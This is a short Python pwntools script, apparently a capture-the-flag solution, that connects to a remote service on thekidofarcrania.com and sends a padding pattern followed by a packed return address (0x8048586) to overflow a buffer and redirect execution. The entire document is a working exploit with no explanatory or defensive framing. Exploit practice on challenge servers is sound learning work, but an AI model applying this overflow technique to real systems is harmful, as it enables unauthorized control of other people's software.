from pwn import *

# Connect to the server
sock = remote("thekidofarcrania.com", 4902)

# Craft the payload
payload = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9' + p32(0x8048586)

# Send the payload
sock.sendlineafter("Input some text:", payload)

# Receive and print the response
while True:
    print(sock.recvline().decode("utf-8"))

# Close the connection
sock.close()
